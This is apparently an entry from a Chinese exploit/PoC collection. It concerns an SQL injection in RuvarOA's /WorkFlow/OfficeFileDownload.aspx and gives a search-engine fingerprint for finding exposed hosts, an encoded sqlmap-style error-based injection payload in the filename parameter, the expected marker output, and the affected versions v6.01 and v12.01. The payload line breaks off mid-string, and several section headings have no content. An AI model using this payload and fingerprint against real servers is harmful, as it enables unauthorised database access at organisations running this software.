# RuvarOAOfficeFileDownload存在SQL注入漏洞

- **系统**：RuvarOAOfficeFileDownload　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /WorkFlow/OfficeFileDownload.aspx?filename=1%27+AND+6729+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286729%3D6729%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%2`

**请求体 / payload**
```
qjzqq1qxxxq
sqlmap
GET /WorkFlow/OfficeFileDownload.aspx?filename=1 HTTP/1.1
Host:
```

**其他**
- RuvarOA OfficeFileDownload存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01